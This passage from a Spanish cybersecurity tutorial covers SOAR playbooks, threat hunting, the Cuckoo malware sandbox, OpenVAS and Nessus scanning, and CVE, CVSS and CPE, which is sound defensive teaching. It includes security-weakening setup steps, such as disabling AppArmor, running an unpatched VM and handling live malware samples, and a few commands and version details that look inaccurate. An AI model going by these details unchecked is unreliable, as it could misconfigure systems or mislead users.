Cuando llega una alerta de intento de intrusión:

- SOAR puede buscar la IP en VirusTotal automáticamente.
- Si la IP es maliciosa, bloquea la IP en el firewall.
- Luego, crea un ticket en TheHive y envía una alerta por correo.
  Todo eso sin intervención humana.

---

### 🚀 ¿Qué es Splunk SOAR (Phantom)?

Splunk SOAR (anteriormente **Phantom**) es una de las plataformas SOAR más potentes del mercado. Te permite:

- **Automatizar tareas con playbooks** en Python o mediante interfaz visual.
- Conectarte a más de 300 herramientas de seguridad (Splunk, Wazuh, EDR, AV, Cortex, TheHive, etc.).
- Crear acciones: bloquear IP, enviar correo, escanear hash, aislar dispositivo, etc.

---

### 🔧 ¿Cómo se instala Splunk SOAR?

#### ✅ Requisitos previos

- Sistema operativo: Ubuntu 20.04 LTS (64 bits) o CentOS 7
- 8 GB de RAM mínimo (recomendado 16 GB)
- 100 GB de espacio en disco
- Acceso a internet

---

#### 💻 Instalación paso a paso en máquina virtual o servidor

##### 🔹 Paso 1: Descargar SOAR

1. Ve a la página de Splunk:
   👉 [https://www.splunk.com/en_us/software/splunk-security-orchestration-and-automation.html](https://www.splunk.com/en_us/software/splunk-security-orchestration-and-automation.html)

2. Regístrate para descargar **Splunk SOAR (Phantom)** OVA (para VM) o paquete DEB (para Ubuntu).

---

##### 🔹 Paso 2: Instalación en Ubuntu (por ejemplo)

1. Sube el archivo `.deb` al servidor:

```bash
scp phantom-server.deb usuario@ip_del_servidor:/tmp/
```

2. Conéctate y actualiza el sistema:

```bash
sudo apt update && sudo apt upgrade -y
```

3. Instala Phantom:

```bash
sudo dpkg -i /tmp/phantom-server.deb
sudo apt --fix-broken install -y
```

4. Inicia los servicios:

```bash
sudo systemctl start phantom
sudo systemctl enable phantom
```

---

##### 🔹 Paso 3: Acceso a la interfaz

1. Ve al navegador y entra en:
   `https://IP_DEL_SERVIDOR/`

2. Login inicial: admin / changeme

---

### 🛠️ ¿Cómo funciona Splunk SOAR?

#### 🔁 Componentes clave

| Componente     | Descripción                                                       |
| -------------- | ----------------------------------------------------------------- |
| **Playbooks**  | Flujos automatizados que ejecutan acciones paso a paso            |
| **Apps**       | Conectores para otras herramientas (AV, EDR, Splunk, Wazuh, etc.) |
| **Containers** | Cada alerta o incidente gestionado                                |
| **Artifacts**  | Datos dentro de un incidente (IPs, hash, email, etc.)             |
| **Actions**    | Pasos individuales (buscar IP, bloquear, enviar email)            |

---

### 📚 Ejemplo completo: Bloqueo automático de IP maliciosa

#### 🎯 Escenario:

- Splunk detecta una alerta por una conexión sospechosa desde una IP externa.
- Se crea automáticamente un **container (incidente)** en Phantom.
- El playbook hace lo siguiente:

---

#### 🔄 Playbook de ejemplo

1. Toma la IP de la alerta.
2. Busca si es maliciosa en VirusTotal.
3. Si es maliciosa:

   - Bloquea la IP en el firewall.
   - Crea un ticket en TheHive.
   - Envía un correo al analista.

4. Si no es maliciosa:

   - Archiva el caso como falso positivo.

---

#### 📌 ¿Cómo se crea el playbook?

Puedes usar dos métodos:

##### 🔸 Opción A: Interfaz visual

1. Entra a Splunk SOAR → _Playbooks_ → _Create New_
2. Arrastra bloques como:

   - **Get IP from artifact**
   - **VirusTotal: reputation**
   - **If (malicious) → block IP**
   - **Send email**

3. Guardas y pruebas el flujo.

##### 🔸 Opción B: Código en Python

```python
def on_start(container):
    ip = phantom.collect2(container=container, datapath=["artifact:*.cef.sourceAddress"])[0][0]
    phantom.act("ip reputation", parameters=[{"ip": ip}], assets=["virustotal"], callback=decision)

def decision(action, success, container, results, handle):
    if "malicious" in results[0]['summary']['reputation']:
        phantom.act("block ip", parameters=[{"ip": results[0]['param']['ip']}], assets=["firewall"])
        phantom.send_email("soc@empresa.com", "IP bloqueada", f"La IP {results[0]['param']['ip']} ha sido bloqueada.")
    else:
        phantom.set_status(container=container, status="Closed")

```

---

### ✅ Resultado del caso:

- El analista no tuvo que intervenir.
- La IP maliciosa fue detectada, bloqueada, y registrada en el sistema.
- Ahorro de tiempo, reacción rápida y trazabilidad total.

---

### 🧩 Integraciones útiles

Splunk SOAR se integra fácilmente con:

- **Splunk SIEM**: recibe alertas automáticas.
- **TheHive**: para crear casos de incidentes.
- **Cortex**: para ejecutar acciones como escaneos.
- **Wazuh, ESET, CrowdStrike, etc.**

---

### 📌 Conclusión

**Splunk SOAR (Phantom)** es una herramienta **clave en la automatización de la respuesta ante incidentes**. Permite que tu equipo actúe más rápido, con menos errores, y con flujos estandarizados.

Con solo un poco de práctica, puedes crear playbooks que:

- Revisan amenazas automáticamente
- Ejecutan acciones de defensa
- Notifican y documentan sin intervención humana

---

[🔼](#índice)

---

## **557. Threat Hunting**

### 🧠 ¿Qué es Threat Hunting?

**Threat Hunting** o **caza de amenazas** es el proceso **proactivo** de buscar actividades maliciosas o amenazas ocultas que podrían no haber sido detectadas por las herramientas tradicionales como antivirus, EDR, SIEM, etc.

> A diferencia de esperar alertas, el analista **toma la iniciativa** para investigar posibles indicadores de compromiso (IoC), comportamientos anómalos o ataques sofisticados.

---

#### 🛡️ Diferencia clave:

| Método tradicional  | Threat Hunting                         |
| ------------------- | -------------------------------------- |
| Reacciona a alertas | Busca sin necesidad de alertas previas |
| Se basa en firmas   | Se basa en hipótesis y comportamiento  |
| Pasivo              | Proactivo                              |

---

### 🧩 Tipos de Threat Hunting

1. **Basado en indicadores de compromiso (IoC)**
   Se busca evidencia de IPs, dominios, hashes conocidos como maliciosos.

2. **Basado en hipótesis (TTPs / MITRE ATT\&CK)**
   Se parte de una suposición: _"¿Y si el atacante ya se movió lateralmente?"_

3. **Basado en inteligencia de amenazas (Threat Intel)**
   Se investiga amenazas conocidas en el sector y se busca su presencia en la red.

---

### 🛠️ Herramientas que se usan

- **SIEM** (Splunk, Wazuh, Graylog): Para buscar eventos históricos.
- **EDR** (CrowdStrike, OpenEDR): Para rastrear actividad del endpoint.
- **osquery** o **Elastic Agent**: Para hacer consultas al sistema operativo.
- **VirusTotal, MISP**: Para comparar artefactos con bases de datos de amenazas.
- **MITRE ATT\&CK**: Para entender las tácticas del adversario.

---

### 🏗️ ¿Cómo se instala un entorno para hacer Threat Hunting?

Vamos a hacerlo **con herramientas gratuitas** en una máquina virtual o servidor. Supongamos que usamos **Wazuh + osquery + MITRE ATT\&CK Navigator**.

---

#### 📦 Instalación básica de entorno (Wazuh + osquery)

##### Paso 1: Instalar Wazuh Manager en una máquina Linux

```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a
```

Esto instala:

- Wazuh Manager
- Filebeat (para enviar logs a Elasticsearch)
- Kibana (interfaz visual)

Accedes a Kibana vía:
👉 `https://IP_SERVIDOR:5601`

---

##### Paso 2: Instalar osquery en el endpoint (máquina Windows o Linux)

**En Windows:**

1. Descarga desde: [https://osquery.io/downloads/official/windows](https://osquery.io/downloads/official/windows)
2. Instala normalmente.
3. Configura para que reporte al servidor Wazuh.

**En Linux:**

```bash
sudo apt install osquery
```

---

##### Paso 3: Integrar con MITRE ATT\&CK Navigator

1. Clona el repositorio de ATT\&CK Navigator:

```bash
git clone https://github.com/mitre-attack/attack-navigator.git
cd attack-navigator/nav-app
npm install
npm run start
```

Esto te da una interfaz para mapear técnicas detectadas con tus búsquedas.

---

### 🧪 Ejemplo práctico: Hunting de "Persistence con tareas programadas"

#### 🎯 Escenario:

Sospechamos que un atacante persiste en el sistema creando tareas programadas (una táctica de persistencia en MITRE ATT\&CK: **T1053.005**).

#### 🧠 Hipótesis:

> _"¿Y si un atacante creó una tarea programada para ejecutar malware tras reinicio?"_

---

#### 🔍 Paso 1: Consultar osquery

En la máquina endpoint:

```sql
SELECT * FROM scheduled_tasks;
```

Esto nos da una lista de tareas programadas. Buscamos:

- Tareas nuevas
- Ubicaciones extrañas (por ejemplo: `AppData\Roaming`)
- Tareas ejecutando scripts o ejecutables sospechosos

---

#### 🔎 Paso 2: Enviar los resultados a Wazuh

Wazuh puede recolectar esta información mediante módulos integrados con osquery. Luego, los logs se visualizan en Kibana.

---

#### ⚠️ Paso 3: Analizar en Kibana

Filtramos por logs de osquery, y detectamos una tarea que ejecuta este comando:

```
C:\Users\victima\AppData\Roaming\update.exe
```

Eso es sospechoso.

---

#### 🧬 Paso 4: Verificar con VirusTotal

Tomamos el hash del archivo:

```powershell
Get-FileHash C:\Users\victima\AppData\Roaming\update.exe
```

Y buscamos en:
👉 [https://www.virustotal.com/](https://www.virustotal.com/)

Si es malicioso, confirmamos la presencia de un atacante.

---

#### 📌 Resultado

✅ Confirmamos la presencia de persistencia.

🛠️ Acciones:

- Eliminamos la tarea.
- Eliminamos el ejecutable.
- Hacemos hardening para evitar futuras persistencias.
- Creamos una alerta automática en Wazuh si vuelve a ocurrir.

---

### 📊 Visualización en MITRE ATT\&CK Navigator

Puedes marcar que has detectado T1053.005 y otras relacionadas. Esto ayuda a mapear cómo actúan los atacantes y a cerrar brechas.

---

### ✅ Conclusión

| Concepto aprendido | Resumen                                          |
| ------------------ | ------------------------------------------------ |
| ¿Qué es?           | Búsqueda proactiva de amenazas                   |
| ¿Cómo se hace?     | Con hipótesis, herramientas y consultas          |
| ¿Qué herramientas? | osquery, Wazuh, SIEM, MITRE ATT\&CK              |
| ¿Caso práctico?    | Detección de persistencia con tareas programadas |
| ¿Resultado?        | Identificación, eliminación y prevención         |

---

[🔼](#índice)

---

## **558. Sandboxing - Cuckoo Sandbox**

### 🔐 ¿Qué es el _sandboxing_?

**Sandboxing** es una técnica de ciberseguridad que permite ejecutar archivos o programas sospechosos en un **entorno aislado** y controlado, para observar su comportamiento sin poner en riesgo el sistema real.

Imagina que quieres abrir un archivo `.exe` que te llegó por correo, pero no estás seguro si es malware. Con un **sandbox**, puedes abrirlo y ver qué hace **sin que infecte tu computadora real**.

---

### 🎯 ¿Para qué sirve?

- Analizar malware de forma segura.
- Ver qué cambios hace un archivo: si crea procesos, descarga otros archivos, se conecta a Internet, etc.
- Obtener **Indicadores de Compromiso (IoC)** como IPs, dominios, nombres de archivos.

---

### 🔬 ¿Qué es Cuckoo Sandbox?

**Cuckoo Sandbox** es una herramienta **open source** para análisis automático de archivos maliciosos en un entorno virtualizado. Ejecuta malware en una máquina virtual (Windows, Linux o Android), monitorea su comportamiento y genera un **informe detallado**.

---

### 🛠️ ¿Qué analiza Cuckoo?

- Comportamiento del sistema (procesos, archivos modificados, claves de registro).
- Actividad de red (conexiones, dominios, direcciones IP).
- Comportamiento del código (APIs, llamadas al sistema).
- Archivos descargados o creados.

---

### 📦 ¿Qué necesitas para instalar Cuckoo Sandbox?

#### Requisitos mínimos:

- Un equipo con Linux (preferiblemente Ubuntu 20.04+)
- Virtualización habilitada (con VirtualBox, KVM o VMware)
- Python 3
- Una máquina virtual invitada con Windows 7, 10 o XP (sin antivirus y sin parches)

---

### ⚙️ Instalación paso a paso de Cuckoo Sandbox en Ubuntu

---

#### 🔧 1. Preparar el sistema

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-dev libffi-dev libssl-dev \
libjpeg-dev zlib1g-dev swig postgresql libpq-dev \
mongodb virtualbox tcpdump apparmor-utils -y
```

#### 🔧 2. Crear usuario para cuckoo

```bash
sudo adduser cuckoo
sudo usermod -aG vboxusers cuckoo
```

> Cambia a este usuario:

```bash
su - cuckoo
```

---

#### 🔧 3. Instalar Cuckoo

```bash
pip3 install -U pip setuptools
pip3 install cuckoo
```

---

#### 🖥️ 4. Crear y configurar máquina virtual para análisis

1. Instala **VirtualBox** y crea una máquina con **Windows 7/10** (sin antivirus, sin actualizaciones).
2. Instala Python 2.7, y un agente llamado `agent.py` en `C:\`:

   - [Descarga `agent.py`](https://github.com/cuckoosandbox/cuckoo/blob/master/agent/agent.py)

3. Desactiva actualizaciones y crea un _snapshot_ limpio.

---

#### 🔄 5. Configurar Cuckoo

```bash
cuckoo init
```

Esto crea la carpeta `~/.cuckoo/`.

Edita los archivos de configuración para enlazar con VirtualBox:

- `~/.cuckoo/conf/virtualbox.conf`
- `~/.cuckoo/conf/cuckoo.conf`
- `~/.cuckoo/conf/processing.conf`

Configura:

```ini
[virtualbox]
machines = cuckoo1

[cuckoo1]
label = cuckoo1
platform = windows
ip = 192.168.56.101
interface = vboxnet0
```

> Asegúrate que la VM esté en red host-only y tenga la IP correcta.

---

#### 🔄 6. Habilitar captura de red (opcional pero útil)

```bash
sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
sudo aa-disable /usr/sbin/tcpdump
```

---

#### ▶️ 7. Ejecutar Cuckoo

En una terminal:

```bash
cuckoo
```

En otra terminal:

```bash
cuckoo web
```

Accede a la interfaz web en:
📍 `http://localhost:8000`

---

### 📁 ¿Cómo subir y analizar un archivo?

1. Ingresa a la interfaz web.
2. Haz clic en "Submit".
3. Carga un archivo `.exe`, `.pdf`, `.doc`, etc.
4. Espera que se analice (se ejecuta en la VM).
5. Mira el **reporte completo** del comportamiento del archivo.

---

### ✅ Caso práctico completo: Analizando un malware con Cuckoo

#### 🧪 Paso 1: Descarga de muestra (legal y con fines educativos)

👉 Usa alguna muestra del sitio [https://dasmalwerk.eu/](https://dasmalwerk.eu/) (solo si es legal y en entorno controlado)

Supongamos que tienes `malicioso.exe`

---

#### 🧪 Paso 2: Subida a Cuckoo

- Vas a la web (`http://localhost:8000`)
- Subes `malicioso.exe`
- Seleccionas la máquina virtual `cuckoo1`
- Presionas “Submit”

---

#### 🧪 Paso 3: Análisis en vivo

- Se enciende la VM
- Se ejecuta el archivo dentro
- Se monitorean conexiones, archivos, procesos, etc.

---

#### 📊 Paso 4: Resultado

- Descubres que el archivo se conecta a `45.33.45.22:8080`
- Crea un archivo en `C:\Users\Admin\AppData\Roaming\evil.dll`
- Modifica el registro para persistencia

---

#### 🧾 Paso 5: Revisión del informe

- Tienes acceso a:

  - Llamadas a APIs sospechosas
  - IPs y dominios externos
  - Screenshots de la ejecución
  - Strings y hashes
  - Relación con otras muestras

---

### 🧠 ¿Por qué es útil Cuckoo Sandbox?

| Ventaja                        | Explicación fácil                              |
| ------------------------------ | ---------------------------------------------- |
| Análisis seguro                | Puedes estudiar malware sin riesgo real        |
| Reportes detallados            | Muestra cómo se comporta el archivo malicioso  |
| Fuente abierta y extensible    | Puedes agregar reglas YARA, herramientas extra |
| Integración con MISP o TheHive | Se puede unir a SOCs y flujos de respuesta     |

---

### 🧩 Integración extra

Puedes combinar Cuckoo con:

- **MISP** → para compartir indicadores.
- **TheHive** → para tickets de incidentes.
- **Splunk/ELK** → para visualización y correlación.

---

### 🧭 Conclusión

| Punto             | Resumen                                          |
| ----------------- | ------------------------------------------------ |
| ¿Qué es?          | Entorno aislado para ejecutar y analizar malware |
| Herramienta usada | Cuckoo Sandbox                                   |
| Requisitos        | Linux, Python, VirtualBox, Windows VM            |
| Proceso           | Instalas → Configuras → Ejecutas → Analizas      |
| Caso práctico     | Análisis de `malicioso.exe` en VM Windows        |
| Resultado         | Informe con comportamiento, red, registro, IoC   |

---

[🔼](#índice)

---

## **559. Gestión de vulnerabilidades y evaluaciones de seguridad**

### 🔍 ¿Qué es la gestión de vulnerabilidades?

La **gestión de vulnerabilidades** es un proceso continuo que consiste en:

1. **Detectar debilidades** (vulnerabilidades) en sistemas, redes y software.
2. **Evaluarlas** según su criticidad.
3. **Corregirlas o mitigarlas** antes de que los atacantes las exploten.

---

### 📌 ¿Qué es una evaluación de seguridad?

Es el proceso de **examinar un sistema** (servidores, redes, aplicaciones) para:

- Identificar configuraciones inseguras.
- Descubrir software obsoleto.
- Encontrar servicios innecesarios o mal configurados.
- Priorizar los riesgos.

👉 Este proceso incluye herramientas como **escáneres de vulnerabilidades**, análisis manual, pruebas de penetración, etc.

---

### 🧱 ¿Por qué es importante?

- Evita brechas de seguridad y ataques.
- Permite cumplir con normativas (ISO 27001, PCI-DSS, etc.).
- Ayuda a planificar parches y actualizaciones.
- Fortalece el sistema antes de un incidente.

---

### 🔧 Herramientas populares

| Herramienta             | Tipo                            | Plataforma          |
| ----------------------- | ------------------------------- | ------------------- |
| **OpenVAS (Greenbone)** | Escáner de vulnerabilidades     | Linux               |
| **Nessus**              | Escáner profesional (comercial) | Windows/Linux/macOS |
| **Nmap**                | Descubrimiento y escaneo básico | Multiplataforma     |
| **Nikto**               | Escáner de vulnerabilidades web | Linux               |
| **Lynis**               | Auditoría de sistemas Unix      | Linux/macOS         |

---

### 🛠️ Instalación paso a paso: OpenVAS (Greenbone Vulnerability Management)

Usaremos **OpenVAS**, una herramienta gratuita y potente.

---

#### 📦 Requisitos previos:

- Sistema operativo: Ubuntu 22.04 LTS (recomendado)
- Acceso a terminal con privilegios de administrador

---

#### 🔧 Paso 1: Actualiza tu sistema

```bash
sudo apt update && sudo apt upgrade -y
```

---

#### 🔧 Paso 2: Instala OpenVAS

```bash
sudo apt install openvas -y
```

Esto instalará todos los componentes necesarios.

---

#### 🔄 Paso 3: Inicializa la base de datos y escáneres

```bash
sudo gvm-setup
```

⚠️ Esto puede demorar varios minutos. Descarga los plugins de vulnerabilidades más recientes.

---

#### 🔐 Paso 4: Crear cuenta de acceso

```bash
sudo gvm-admin --create-user
```

Guarda el usuario y contraseña que te dé.

---

#### ▶️ Paso 5: Iniciar servicios

```bash
sudo gvm-check-setup
sudo gvm-start
```

---

#### 🌐 Paso 6: Accede a la interfaz web

Abre en tu navegador:

```
https://localhost:9392
```

Ingresa con tu usuario y contraseña.

---

### 🧪 ¿Cómo usar OpenVAS?

#### Paso 1: Crear un **target**

- Ingresa la IP o nombre del sistema que quieres escanear.
- Puedes escanear: un equipo, red local o un sitio web.

---

##### Paso 2: Crear un **task** (tarea)

- Asocia la tarea al target.
- Selecciona tipo de escaneo: completo, rápido, web, etc.
- Inicia el escaneo.

---

#### Paso 3: Espera y analiza el resultado

- Verás vulnerabilidades clasificadas por **criticidad**: Alta, Media, Baja.
- Cada hallazgo tiene:

  - Descripción del problema.
  - CVE relacionado.
  - Recomendación para corregirlo.
  - Severidad (con puntuación CVSS).

---

### ✅ Ejemplo completo: Escaneo de servidor Ubuntu vulnerable

#### 🎯 Escenario

Tienes un servidor Ubuntu (por ejemplo en VirtualBox) con servicios expuestos:

- Apache (sin actualizar)
- OpenSSH (versión vieja)

---

#### 🚀 Ejecución del escaneo

1. Desde OpenVAS, creas un target con la IP del servidor (`192.168.56.101`).
2. Configuras una tarea con escaneo completo.
3. Ejecutas la tarea y esperas.

---

#### 📊 Resultado

El informe muestra:

| Vulnerabilidad                       | CVE            | Severidad | Solución recomendada              |
| ------------------------------------ | -------------- | --------- | --------------------------------- |
| Apache HTTP Server 2.4.29 vulnerable | CVE-2019-0211  | Alta      | Actualizar a versión 2.4.39 o más |
| OpenSSH 7.2 con fuga de memoria      | CVE-2016-10012 | Media     | Actualizar OpenSSH                |

---

#### 🛠️ Correcciones

```bash
# Actualizar Apache
sudo apt install apache2 -y

# Actualizar OpenSSH
sudo apt install openssh-server -y
```

Luego, vuelves a correr el escaneo para validar que fueron corregidas.

---

### 🧠 Buenas prácticas de gestión de vulnerabilidades

| Acción                            | Ejemplo                                       |
| --------------------------------- | --------------------------------------------- |
| Escanear regularmente             | 1 vez por semana o después de cada parche     |
| Priorizar vulnerabilidades        | Atacar primero las de **alto riesgo**         |
| Documentar y asignar responsables | Usar una herramienta como **TheHive**         |
| Automatizar parches               | Con herramientas como **Ansible** o **WSUS**  |
| Capacitar al equipo               | Entender qué es una CVE, CVSS, exploits, etc. |

---

### 📚 Recurso extra

- CVE: [https://cve.mitre.org/](https://cve.mitre.org/)
- Base de datos de vulnerabilidades de NIST: [https://nvd.nist.gov](https://nvd.nist.gov)
- Greenbone/OpenVAS: [https://greenbone.net/](https://greenbone.net/)

---

### 🧭 Conclusión

| Elemento           | Resumen                                                    |
| ------------------ | ---------------------------------------------------------- |
| ¿Qué es?           | Proceso de encontrar y corregir vulnerabilidades           |
| Herramienta usada  | OpenVAS                                                    |
| Proceso            | Instalar → Escanear → Analizar → Corregir                  |
| Caso práctico      | Escaneo de un servidor Ubuntu con Apache y SSH antiguos    |
| Resultado esperado | Identificación y remediación de problemas                  |
| Mejores prácticas  | Escaneos regulares, priorización, automatización y control |

---

[🔼](#índice)

---

## **560. Análisis de vulnerabilidades - Nessus**

### 🧠 ¿Qué es Nessus?

**Nessus** es una de las herramientas de escaneo de vulnerabilidades más populares del mundo. Fue creada por Tenable y permite:

- Detectar fallos de seguridad en sistemas operativos, servidores, aplicaciones, redes, etc.
- Encontrar contraseñas débiles, puertos abiertos, servicios inseguros, y más.
- Proporcionar informes con severidad (baja, media, alta, crítica) y soluciones.

---

### 🧱 ¿Por qué usar Nessus?

- **Actualizaciones frecuentes de vulnerabilidades (CVE)**
- **Escaneo profundo** de más de 60,000 vulnerabilidades conocidas.
- Ideal para **auditorías de seguridad internas** o cumplimiento de normativas.
- Interfaz web muy amigable.

---

### 📦 Versiones de Nessus

| Versión                        | Descripción                           |
| ------------------------------ | ------------------------------------- |
| **Nessus Essentials (Gratis)** | Hasta 16 hosts. Ideal para aprender.  |
| Nessus Professional            | Para empresas. Soporte completo.      |
| Nessus Expert                  | Incluye escaneo de código, nube, etc. |

---

### 🔧 ¿Cómo se instala Nessus? (en Ubuntu 22.04 o Kali Linux)

#### 🛠️ Requisitos:

- Tener acceso de administrador (`sudo`)
- Conexión a internet
- Navegador moderno (Chrome, Firefox)

---

#### 1. 📥 Descargar Nessus

Ve a:

🔗 [https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)

- Regístrate gratis para obtener una **clave de activación (activation code)**.
- Descarga el archivo `.deb` correspondiente a tu sistema (por ejemplo: `Nessus-10.x.x-ubuntu1110_amd64.deb`)

O descarga por terminal:

```bash
wget https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.x.x-ubuntu1110_amd64.deb
```

(Sustituye la URL con la versión más reciente desde el sitio)

---

#### 2. 📦 Instalar Nessus

```bash
sudo dpkg -i Nessus-10.x.x-ubuntu1110_amd64.deb
```

Corrige dependencias si es necesario:

```bash
sudo apt --fix-broken install
```

---

#### 3. ▶️ Iniciar el servicio

```bash
sudo systemctl start nessusd
sudo systemctl enable nessusd
```

Verifica que esté corriendo:

```bash
sudo systemctl status nessusd
```

---

#### 4. 🌐 Acceder a la interfaz web

En tu navegador, visita:

```
https://localhost:8834
```

⚠️ Acepta el certificado autofirmado (página insegura).

---

#### 5. 🧩 Configuración inicial

1. Escoge **Nessus Essentials**.
2. Ingresa tu **Activation Code** (te lo envían al correo).
3. Crea un usuario y contraseña.
4. Espera unos minutos mientras se descargan los plugins (firmas de vulnerabilidades).

---

### ✅ ¿Cómo se usa Nessus?

#### 🟢 Paso 1: Crear un nuevo escaneo

- Haz clic en "New Scan".
- Selecciona **Basic Network Scan**.
- Define:

  - Nombre del escaneo.
  - Dirección IP o rango a escanear (`192.168.1.10` o `192.168.1.0/24`).
  - Opcional: credenciales SSH para escaneos más profundos.

---

#### 🟢 Paso 2: Ejecutar el escaneo

- Da clic en "Save" y luego "Launch".
- Espera a que finalice. Puede tomar varios minutos.

---

#### 🟢 Paso 3: Ver resultados

Una vez terminado:

- Nessus te mostrará:

  - Número total de vulnerabilidades.
  - Clasificación: **Críticas**, **Altas**, **Medias**, **Bajas**, **Informativas**.
  - Descripción detallada.
  - **CVE**, **CVSS Score** y **cómo solucionarlo**.

---

### 🧪 Ejemplo completo

#### 🎯 Escenario

Escanearemos una máquina virtual Ubuntu con servicios expuestos:

- OpenSSH 7.4
- Apache 2.4.29
- MySQL 5.7

---

#### 🔄 Flujo

1. Instalaste Nessus en tu máquina anfitriona (host).
2. Desde Nessus, escaneas la IP de tu VM: `192.168.56.101`.
3. Al finalizar el escaneo, Nessus detecta:

| Servicio detectado | Vulnerabilidad encontrada                 | Severidad | CVE           |
| ------------------ | ----------------------------------------- | --------- | ------------- |
| OpenSSH            | Versión vulnerable a información filtrada | Alta      | CVE-2016-0777 |
| Apache             | Permite ejecución remota de código        | Crítica   | CVE-2019-0211 |
| MySQL              | Contraseña débil detectada                | Alta      | CVE-2012-2122 |

---

#### 🛠️ Acciones sugeridas

- **Actualizar OpenSSH:**

  ```bash
  sudo apt update && sudo apt install openssh-server
  ```

- **Actualizar Apache:**

  ```bash
  sudo apt install apache2
  ```

- **Cambiar contraseña de MySQL y aplicar parches.**

Luego, vuelves a lanzar el escaneo para validar que el riesgo haya sido eliminado.

---

### 🧠 Buenas prácticas con Nessus

| Recomendación                | Por qué                                |
| ---------------------------- | -------------------------------------- |
| Realizar escaneos periódicos | Detectar nuevas vulnerabilidades       |
| Actualizar plugins           | Base de datos de amenazas reciente     |
| Usar credenciales (SSH, RDP) | Escaneo más profundo y preciso         |
| Guardar reportes PDF/HTML    | Para auditorías o informes gerenciales |
| Integrar con SIEM o TheHive  | Automatización y gestión de incidentes |

---

### 📚 Recursos adicionales

- CVE Details: [https://www.cvedetails.com/](https://www.cvedetails.com/)
- Tenable Docs: [https://docs.tenable.com/nessus/](https://docs.tenable.com/nessus/)
- Base de datos CVSS: [https://nvd.nist.gov](https://nvd.nist.gov)

---

### 📌 Conclusión

| Elemento           | Valor                                               |
| ------------------ | --------------------------------------------------- |
| Herramienta        | Nessus Essentials                                   |
| Función            | Escanear vulnerabilidades en sistemas y redes       |
| Instalación        | Vía `.deb` en Ubuntu o Kali                         |
| Resultado esperado | Reportes detallados con recomendaciones y severidad |
| Caso práctico      | Escaneo de servidor con Apache, MySQL y OpenSSH     |
| Nivel recomendado  | Estudiantes, sysadmins, analistas de ciberseguridad |

---

[🔼](#índice)

---

## **561. CVE, CVSS y CPE**

### 🧠 ¿Qué son?

| Término  | Significado                            | ¿Para qué sirve?                                                   |
| -------- | -------------------------------------- | ------------------------------------------------------------------ |
| **CVE**  | _Common Vulnerabilities and Exposures_ | Identifica una vulnerabilidad específica con un código único.      |
| **CVSS** | _Common Vulnerability Scoring System_  | Asigna una puntuación de severidad de 0.0 a 10.0 a una CVE.        |
| **CPE**  | _Common Platform Enumeration_          | Identifica de forma estandarizada el software o hardware afectado. |

---

### 🟡 1. ¿Qué es un **CVE**?

- Es como el DNI o número único de una **vulnerabilidad específica**.
- Se usa para compartir información de forma consistente a nivel mundial.

#### ✍️ Formato de un CVE:

```
CVE-AÑO-NÚMERO
```

#### ✅ Ejemplo:

```
CVE-2021-44228
```

Esta es la famosa **vulnerabilidad de Log4j**, que permitió ejecución remota de código en miles de servidores.

---

### 🔴 2. ¿Qué es el **CVSS**?

Es el **sistema de puntuación** que mide cuán **grave** es una vulnerabilidad.

- Va de **0.0** (nada grave) a **10.0** (crítica).
- Se calcula en base a varios factores como:

  - **Vector de ataque** (¿remoto o físico?)
  - **Complejidad del ataque**
  - **Requiere autenticación**
  - **Impacto en confidencialidad, integridad y disponibilidad**

#### 🎯 Ejemplo:

| CVE                       | CVSS Score | Severidad |
| ------------------------- | ---------- | --------- |
| CVE-2021-44228 (Log4j)    | 10.0       | Crítica   |
| CVE-2020-1472 (Zerologon) | 10.0       | Crítica   |
| CVE-2021-26855 (Exchange) | 9.8        | Crítica   |

---

### 🔵 3. ¿Qué es un **CPE**?

Sirve para identificar **exactamente** a qué productos afecta una vulnerabilidad.

- Es un lenguaje estándar para nombrar productos de software/hardware.
- Facilita a herramientas como Nessus o Wazuh relacionar un CVE con tu sistema.

#### ✅ Ejemplo de CPE:

```
cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*
```

Significa:

- Vendor: Apache
- Producto: Log4j
- Versión: 2.14.1

---

### 🧪 Ejemplo completo paso a paso

#### 🎯 Escenario:

Eres analista de seguridad. Escaneas un servidor Linux y tu herramienta (como Nessus o OpenVAS) te muestra:

```
Vulnerabilidad encontrada: CVE-2021-44228 (Log4Shell)
```

---

#### 🔍 Paso 1: Buscar detalles del CVE

Puedes ir a:

🔗 [https://www.cve.org](https://www.cve.org)

🔗 [https://nvd.nist.gov/vuln/search](https://nvd.nist.gov/vuln/search)

Busca: `CVE-2021-44228`

**Resultado:**

- Producto afectado: Apache Log4j 2.x
- Vector de ataque: Remoto
- Tipo: Ejecución remota de código (RCE)

---

#### 🔢 Paso 2: Analizar su puntuación CVSS

CVSS: **10.0** (CRÍTICA)

Impacto:

- Confidencialidad: Completa
- Integridad: Completa
- Disponibilidad: Completa

Solución:

- Actualizar a Log4j >= 2.16.0

---

#### 🔎 Paso 3: Ver si mi software tiene ese CPE

Tu servidor tiene instalado:

```
Apache Log4j 2.14.1
```

Buscas en el sitio del NIST y encuentras el CPE relacionado:

```
cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*
```

✅ Confirmas que tu sistema es vulnerable.

---

#### ⚙️ Paso 4: Mitigación

Actualizas con:

```bash
# Si estás usando Log4j como dependencia:
mvn dependency:tree | grep log4j

# Luego en el pom.xml (Java):
<version>2.17.1</version>

# O actualizas tu contenedor/app
```

Después de actualizar, haces un nuevo escaneo con Nessus y el CVE desaparece del reporte.

---

### 📚 Recomendaciones para usarlos bien

| Acción                      | Herramienta                                                            |
| --------------------------- | ---------------------------------------------------------------------- |
| Buscar CVE                  | [https://cve.org](https://cve.org) / NVD                               |
| Ver CVSS de un CVE          | [https://nvd.nist.gov](https://nvd.nist.gov)                           |
| Identificar CPEs            | [https://nvd.nist.gov/products/cpe](https://nvd.nist.gov/products/cpe) |
| Escanear CPEs en tu sistema | Nessus, Wazuh, OpenVAS                                                 |

---

### 🧩 Resumen final

| Concepto | Descripción corta               | Ejemplo                            |
| -------- | ------------------------------- | ---------------------------------- |
| **CVE**  | Identificador de vulnerabilidad | CVE-2021-44228                     |
| **CVSS** | Severidad del CVE               | 10.0 (crítica)                     |
| **CPE**  | Software o hardware afectado    | cpe:2.3\:a:apache\:log4j:2.14.1:\* |

---

